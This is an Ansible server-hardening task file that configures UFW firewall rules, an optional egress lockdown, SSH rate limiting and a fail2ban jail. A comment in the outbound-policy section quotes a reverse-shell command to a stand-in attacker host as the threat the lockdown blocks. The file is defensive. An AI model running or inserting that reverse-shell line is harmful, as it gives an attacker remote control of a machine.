---
- name: Install UFW and fail2ban
  ansible.builtin.apt:
    name: [ufw, fail2ban]
    state: present

- name: UFW default deny incoming
  community.general.ufw:
    direction: incoming
    policy: deny

# --- Outbound policy ---------------------------------------------------
# Default: allow all outbound (most servers need it). Optional egress
# lockdown flips this to default-deny and only permits the ports a
# hardened box actually needs, which stops the most common reverse
# shells (e.g. bash -i >& /dev/tcp/attacker/4444) since arbitrary
# high-port callbacks are refused. Note: 80/443 stay open for apt,
# certbot, B2 and Telegram, so C2 tunnelled over 443 is NOT stopped by
# this alone - that is what the detection layers (role 09) are for.
- name: UFW default allow outgoing (egress lockdown disabled)
  community.general.ufw:
    direction: outgoing
    policy: allow
  when: not (egress_lockdown | default(false))

- name: Egress lockdown block
  when: egress_lockdown | default(false)
  block:
    - name: Allow required outbound ports (DNS, NTP, HTTP/S)
      community.general.ufw:
        rule: allow
        direction: out
        port: "{{ item.port }}"
        proto: "{{ item.proto }}"
      loop:
        - { port: "53", proto: udp }
        - { port: "53", proto: tcp }
        - { port: "123", proto: udp }
        - { port: "80", proto: tcp }
        - { port: "443", proto: tcp }

    - name: Allow extra outbound ports (configured per host)
      community.general.ufw:
        rule: allow
        direction: out
        port: "{{ item.port | string }}"
        proto: "{{ item.proto | default('tcp') }}"
      loop: "{{ egress_allow_extra | default([]) }}"

    - name: UFW default deny outgoing
      community.general.ufw:
        direction: outgoing
        policy: deny

- name: Allow HTTP and HTTPS
  community.general.ufw:
    rule: allow
    port: "{{ item }}"
    proto: tcp
  loop: ["80", "443"]

- name: Allow SSH with rate limiting (standard mode, fwknop gates it in high mode)
  community.general.ufw:
    rule: limit
    port: "{{ ssh_port }}"
    proto: tcp
  when: paranoia_level == "standard"

- name: Break-glass, allow SSH from office static IP directly
  community.general.ufw:
    rule: allow
    port: "{{ ssh_port }}"
    proto: tcp
    src: "{{ office_static_ip }}"
  when: office_static_ip | length > 0

- name: Enable UFW
  community.general.ufw:
    state: enabled

- name: fail2ban jail config
  ansible.builtin.copy:
    dest: /etc/fail2ban/jail.local
    mode: "0644"
    content: |
      [DEFAULT]
      bantime  = 1h
      bantime.increment = true
      bantime.factor = 2
      findtime = 10m
      maxretry = 4
      backend = systemd

      [sshd]
      enabled = true
      port = {{ ssh_port }}

      [nginx-http-auth]
      enabled = true

      [nginx-botsearch]
      enabled = true
  notify: restart fail2ban
